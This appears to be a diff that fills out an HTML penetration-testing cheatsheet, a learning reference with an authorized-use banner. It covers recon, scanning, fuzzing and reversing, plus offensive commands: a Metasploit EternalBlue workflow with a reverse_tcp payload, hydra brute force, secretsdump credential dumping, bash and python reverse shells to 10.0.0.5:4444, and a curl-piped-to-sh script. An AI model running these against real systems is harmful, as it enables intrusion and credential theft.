@@ -5,10 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Penetration Testing & Vulnerability Research Cheatsheet — Robust Commands</title>
 
-<!-- Prism.js CSS -->
 <link href="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism-tomorrow.css" rel="stylesheet" />
 
-<!-- Favicon -->
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='16' fill='%230f1720'/%3E%3Ctext x='50' y='58' font-size='44' text-anchor='middle' fill='%237c3aed' font-family='Inter,Arial' font-weight='700'%3EPT%3C/text%3E%3C/svg%3E">
 
 <style>
@@ -41,7 +39,6 @@ footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
 <strong>⚠️ AUTHORIZED USE ONLY</strong> — Run these commands only in lab environments or on targets you have explicit written permission to test.
 </div>
 
-<!-- Example Section -->
 <h2 onclick="toggleSection('s1')">1) Recon & OSINT <span class="chip" data-tag="osint">OSINT</span> <span class="chip" data-tag="recon">Recon</span></h2>
 <div id="s1">
 <p class="section-desc">Footprinting, WHOIS, DNS lookups, and basic HTTP checks.</p>
@@ -60,13 +57,259 @@ dig +noall +answer $TARGET NS
 curl -I -L --max-redirs 5 https://$TARGET
 
 # Certificate names (crt.sh)
-curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u</code></pre>
+curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u
+# OSINT (AUTHORIZED USE ONLY)
+theharvester -d example.com -b google -l 500
+shodan host 1.2.3.4</code></pre>
 <p class="command-desc">Commands gather domain info, DNS records, HTTP headers, and passive certificate data.</p>
 </div>
 
-<!-- Repeat similar sections for s2…s15 here (omitted for brevity, same structure as above) -->
+<h2 onclick="toggleSection('s2')">2) Subdomain & DNS Enumeration <span class="chip" data-tag="dns">DNS</span> <span class="chip" data-tag="subdomain">Subdomain</span></h2>
+<div id="s2">
+<p class="section-desc">Discovering subdomains and advanced DNS records using specialized tools.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Amass (passive + active + brute)
+amass enum -d example.com -o amass.txt
 
-<!-- Buttons -->
+# Subfinder (fast passive)
+subfinder -d example.com -o subfinder.txt
+
+# crt.sh (via curl + jq)
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# DNS recon
+dnsrecon -d example.com</code></pre>
+<p class="command-desc">Uses passive sources (Amass, Subfinder) and certificate transparency logs (crt.sh) for comprehensive target scope.</p>
+</div>
+
+<h2 onclick="toggleSection('s3')">3) Port & Service Discovery <span class="chip" data-tag="network">Network</span> <span class="chip" data-tag="nmap">Nmap</span></h2>
+<div id="s3">
+<p class="section-desc">Aggressive port scanning, service versioning, and banner grabbing.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Nmap (version, default scripts, full ports)
+nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24
+
+# Host discovery (ping scan)
+nmap -sn 192.0.2.0/24
+
+# Banner grab with netcat (HTTP 80)
+nc -vz 192.0.2.10 80
+
+# Banner grab with netcat (SMTP 25)
+echo | nc 192.0.2.10 25</code></pre>
+<p class="command-desc">The Nmap command is a safe, thorough pattern: default scripts, service versions, all ports ($p-), fast timing ($T4), and output formats ($oA).</p>
+</div>
+
+<h2 onclick="toggleSection('s4')">4) Web Discovery & Fuzzing <span class="chip" data-tag="web">Web</span> <span class="chip" data-tag="fuzzing">Fuzzing</span></h2>
+<div id="s4">
+<p class="section-desc">Bruteforcing directories, files, and virtual hosts.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># ffuf (directory/file fuzzing)
+ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json
+
+# gobuster (dir + vhost)
+gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt</code></pre>
+<p class="command-desc">Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).</p>
+</div>
+
+<h2 onclick="toggleSection('s5')">5) Web Application Testing <span class="chip" data-tag="webapp">Webapp</span> <span class="chip" data-tag="sql">SQL</span> <span class="chip" data-tag="xss">XSS</span></h2>
+<div id="s5">
+<p class="section-desc">Quick vulnerability checks for SQLi and XSS, plus basic HTTP diagnostics.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># HTTP quick checks (headers only)
+curl -I -L https://example.com
+
+# nikto (webserver checks)
+nikto -h https://example.com -output nikto.txt
+
+# sqlmap (ONLY in-scope & lab)
+sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs
+
+# XSS testing (lab only)
+xsstrike -u "https://example.com/page?param=1"
+
+# parameter discovery
+arjun -u "https://example.com/page" -o arjun.txt</code></pre>
+<p class="command-desc">Tools for checking common application layer flaws and enumerating hidden parameters.</p>
+</div>
+
+<h2 onclick="toggleSection('s6')">6) Vulnerability Scanning & SCA <span class="chip" data-tag="cve">CVE</span> <span class="chip" data-tag="sbom">SBOM</span></h2>
+<div id="s6">
+<p class="section-desc">Automated vulnerability template scanning, SBOM generation, and analysis.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># nuclei (fast templates)
+nuclei -l hosts.txt -t cves/ -o nuclei_results.txt
+
+# syft -> generate SBOM (Software Bill of Materials)
+syft packages dir:./project -o json > sbom.json
+
+# grype -> scan SBOM
+grype sbom:sbom.json
+
+# query NVD (example)
+curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .</code></pre>
+<p class="command-desc">Uses open-source tools for infrastructure scanning (Nuclei) and dependency analysis (Syft/Grype).</p>
+</div>
+
+<h2 onclick="toggleSection('s7')">7) Passwords, Credentials & AD Tooling <span class="chip" data-tag="passwords">Passwords</span> <span class="chip" data-tag="ad">AD</span></h2>
+<div id="s7">
+<p class="section-desc">Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration tools.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># hydra (online bruteforce) - AUTHORIZED ONLY
+hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt
+
+# john / hashcat (offline cracking)
+john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
+hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# impacket (examples: secretsdump)
+python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets
+
+# BloodHound collection
+Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip</code></pre>
+<p class="command-desc">Standard tools for credential testing, hash cracking, and AD environment assessment.</p>
+</div>
+
+<h2 onclick="toggleSection('s8')">8) Exploitation: Metasploit Framework (MSF) <span class="chip" data-tag="exploit">Exploit</span> <span class="chip" data-tag="msf">MSF</span></h2>
+<div id="s8">
+<p class="section-desc">Core Metasploit commands for searching, configuring, and executing exploits.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># start msfconsole
+msfconsole
+
+# search
+search cve:2017-0143
+search type:exploit platform:windows smb
+
+# use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# show/set options
+show options
+set RHOSTS 192.168.1.0/24
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+
+# check (non-destructive)
+check
+
+# exploit (authorized/lab only)
+exploit</code></pre>
+<p class="command-desc">A template workflow for using auxiliary and exploit modules in the Metasploit console.</p>
+</div>
+
+<h2 onclick="toggleSection('s9')">9) Post-Exploitation: Shells & Enumeration <span class="chip" data-tag="shell">Shell</span> <span class="chip" data-tag="privesc">Privesc</span></h2>
+<div id="s9">
+<p class="section-desc">Listener commands, common reverse shell one-liners, and local privilege escalation helpers.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># netcat listener (catch reverse shells)
+nc -lvnp 4444
+
+# bash reverse shell
+bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+
+# python reverse shell
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+# linux enumeration (lab)
+curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh
+
+# windows enumeration
+.\winpeas.exe</code></pre>
+<p class="command-desc">Essential commands for establishing and maintaining remote access and internal host reconnaissance.</p>
+</div>
+
+<h2 onclick="toggleSection('s10')">10) Network & TLS Checks <span class="chip" data-tag="network">Network</span> <span class="chip" data-tag="tls">TLS</span></h2>
+<div id="s10">
+<p class="section-desc">Traffic capture, packet analysis, and SSL/TLS configuration checks.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># tcpdump (capture 1000 packets on eth0)
+tcpdump -i eth0 -w capture.pcap -c 1000
+
+# tshark read (filter HTTP)
+tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
+
+# quick cert info
+openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
+
+# sslyze (comprehensive TLS scan)
+sslyze --regular example.com:443</code></pre>
+<p class="command-desc">Commands for network diagnostics and assessing the cryptographic strength of web endpoints.</p>
+</div>
+
+<h2 onclick="toggleSection('s11')">11) Vulnerability Research & PoC Triage <span class="chip" data-tag="vulnres">VulnRes</span> <span class="chip" data-tag="poc">PoC</span></h2>
+<div id="s11">
+<p class="section-desc">Searching local exploit databases and safely running proof-of-concept code in isolation.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># searchsploit
+searchsploit "CVE-2021-44228"
+searchsploit -m 49993  # copy exploit by EDB ID
+
+# fetch PoC (read-only)
+curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py
+
+# run PoC inside an isolated, no-network container (safest approach)
+docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"</code></pre>
+<p class="command-desc">Emphasizes local search (searchsploit) and the use of network-isolated containers to prevent lateral movement.</p>
+</div>
+
+<h2 onclick="toggleSection('s12')">12) Binary Reversing & Exploit Development <span class="chip" data-tag="reversing">Reverse</span> <span class="chip" data-tag="pwn">Pwn</span></h2>
+<div id="s12">
+<p class="section-desc">Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># ELF inspection
+readelf -h binary
+objdump -d binary | less
+strings binary
+
+# radare2
+r2 -AA binary
+
+# ropgadget (search for pop/ret gadgets)
+ropgadget --binary binary --only "pop|ret" > gadgets.txt
+
+# gdb + pwndbg (start debugging session)
+gdb -q ./binary</code></pre>
+<p class="command-desc">Tools used for analyzing executable file headers, assembly code, and preparing buffer overflow exploits.</p>
+</div>
+
+<h2 onclick="toggleSection('s13')">13) Fuzzing <span class="chip" data-tag="fuzzing">Fuzzing</span></h2>
+<div id="s13">
+<p class="section-desc">Instrumented binary fuzzing and HTTP request fuzzing for input discovery.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># AFL (instrumented binary)
+afl-fuzz -i in_dir -o out_dir -- ./target @@
+
+# wfuzz for HTTP (parameter discovery)
+wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"</code></pre>
+<p class="command-desc">AFL is used for finding crashes in C/C++ binaries; Wfuzz is used for black-box web fuzzing.</p>
+</div>
+
+<h2 onclick="toggleSection('s14')">14) Mobile & Firmware Analysis <span class="chip" data-tag="mobile">Mobile</span> <span class="chip" data-tag="firmware">Firmware</span></h2>
+<div id="s14">
+<p class="section-desc">Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># android decompile / inspect (apktool)
+apktool d app.apk -o app_src
+
+# android decompile / inspect (jadx)
+jadx -d out app.apk
+
+# frida (dynamic hooks) - authorized/lab only
+frida -U -f com.example.app -l script.js --no-pause
+
+# firmware extraction
+binwalk -e firmware.bin
+strings firmware.bin | grep -i password</code></pre>
+<p class="command-desc">Commands for static and dynamic analysis of Android apps and embedded system binaries.</p>
+</div>
+
+<h2 onclick="toggleSection('s15')">15) Safe PoC Testing & Logging <span class="chip" data-tag="safety">Safety</span> <span class="chip" data-tag="logging">Logging</span></h2>
+<div id="s15">
+<p class="section-desc">Ensuring safe, reproducible testing environments and comprehensive logging.</p>
+<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># isolated container (no external network)
+docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash
+
+# spin up target service in container (lab)
+docker run --rm -p 8080:80 vuln-app:latest
+
+# logging with timestamps & tool version
+(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt
+
+# save JSON where possible
+nuclei -o nuclei.json -oJ nuclei.json
+ffuf -o ffuf.json -of json</code></pre>
+<p class="command-desc">Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.</p>
+</div>
+
+
 <div style="margin:12px 0">
 <button id="toggleAll">Collapse All</button>
 <button class="primary" id="downloadPdf">Export as PDF</button>
@@ -77,7 +320,6 @@ Built for learning & defensive security • Use responsibly • Last update: 202
 </footer>
 </div>
 
-<!-- Prism -->
 <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/prism.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-bash.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
